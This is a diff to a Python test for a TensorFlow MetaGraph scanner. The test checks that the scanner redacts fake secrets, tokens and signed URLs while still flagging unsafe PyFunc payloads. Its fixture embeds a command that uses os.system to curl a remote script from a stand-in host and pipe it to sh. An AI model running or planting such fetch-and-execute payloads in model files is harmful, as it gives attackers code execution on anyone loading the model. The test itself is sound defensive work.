@@ -475,35 +475,52 @@ def test_tf_metagraph_scanner_detects_unsafe_ops_and_executable_payload_signals(
 
 def test_tf_metagraph_scanner_redacts_sensitive_previews_and_examples(tmp_path: Path) -> None:
     sensitive_url = "https://example.com/p.sh?X-Amz-Signature=SECRET123&safe=1"
+    path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
     sensitive_command = f"python -c \"import os; os.system('curl {sensitive_url} | sh')\" client_secret=supersecret"
     sensitive_meta = tmp_path / "sensitive-preview.meta"
     sensitive_meta.write_bytes(
         _build_metagraph(
             graph_nodes=[
                 {
-                    "name": "pyfunc_node",
+                    "name": "pyfunc_node_token=nodesecret",
                     "op": "PyFunc",
                     "attrs": {
-                        "script": sensitive_command,
+                        "script_token=attrsecret": sensitive_command,
                         "library_path": "s3://bucket/model.so?token=rawtoken",
+                        "gcs_path": (
+                            f"https://storage.googleapis.com/model-bucket/{path_token}/model.so"
+                            "?X-Goog-Signature=GCSSECRET"
+                        ),
                     },
                 }
             ],
-            collection_bytes={"runtime_hook": [sensitive_command.encode("utf-8")]},
+            collection_bytes={"runtime_hook_token=collectionsecret": [sensitive_command.encode("utf-8")]},
         )
     )
 
     result = TensorFlowMetaGraphScanner().scan(str(sensitive_meta))
-    serialized_details = json.dumps([check.details for check in result.checks], sort_keys=True)
+    serialized_result = json.dumps(
+        {
+            "checks": [check.to_dict() for check in result.checks],
+            "issues": [issue.to_dict() for issue in result.issues],
+        },
+        sort_keys=True,
+    )
 
-    assert "SECRET123" not in serialized_details
-    assert "supersecret" not in serialized_details
-    assert "rawtoken" not in serialized_details
-    assert "X-Amz-Signature=<redacted>" in serialized_details
-    assert "client_secret=<redacted>" in serialized_details
-    assert "token=<redacted>" in serialized_details
-    assert "os.system" in serialized_details
-    assert "example.com/p.sh" in serialized_details
+    assert "SECRET123" not in serialized_result
+    assert "supersecret" not in serialized_result
+    assert "rawtoken" not in serialized_result
+    assert path_token not in serialized_result
+    assert "GCSSECRET" not in serialized_result
+    assert "nodesecret" not in serialized_result
+    assert "attrsecret" not in serialized_result
+    assert "collectionsecret" not in serialized_result
+    assert "X-Amz-Signature=<redacted>" in serialized_result
+    assert "X-Goog-Signature=<redacted>" in serialized_result
+    assert "client_secret=<redacted>" in serialized_result
+    assert "token=<redacted>" in serialized_result
+    assert "os.system" in serialized_result
+    assert "example.com/p.sh" in serialized_result
 
 
 def test_tf_metagraph_scanner_preserves_benign_public_preview_context(tmp_path: Path) -> None:
